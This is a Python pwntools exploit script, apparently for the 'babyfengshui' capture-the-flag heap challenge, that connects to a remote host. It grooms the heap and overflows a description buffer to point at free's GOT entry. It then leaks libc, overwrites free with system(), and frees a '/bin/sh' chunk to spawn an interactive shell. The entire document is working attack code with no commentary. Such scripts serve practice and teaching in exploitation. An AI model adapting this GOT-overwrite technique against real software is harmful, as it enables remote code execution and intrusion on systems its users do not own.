from pwn import *
elf = ELF('babyfengshui')
io = remote("111.198.29.45", "35265")
context.log_level = 'debug'


def add_user(size, length, text):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("description: ", str(size))
    io.sendlineafter("name: ", 'AAAA')
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)


def delete_user(idx):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("index: ", str(idx))


def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))


def update_desc(idx, length, text):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)


add_user(0x80, 0x80, 'AAAA')  # 0
add_user(0x80, 0x80, 'AAAA')  # 1
add_user(0x8, 0x8, '/bin/sh\x00')  # 2
delete_user(0)

add_user(0x100, 0x19c, "A" * 0x198 + p32(elf.got['free']))  # 0

display_user(1)
io.recvuntil("description: ")
free_addr = u32(io.recvn(4))
print hex(free_addr - 0x70750)
system_addr = free_addr - 0x70750 + 0x0003a940
log.info("system address: 0x%x" % system_addr)

update_desc(1, 0x4, p32(system_addr))

delete_user(2)

io.interactive()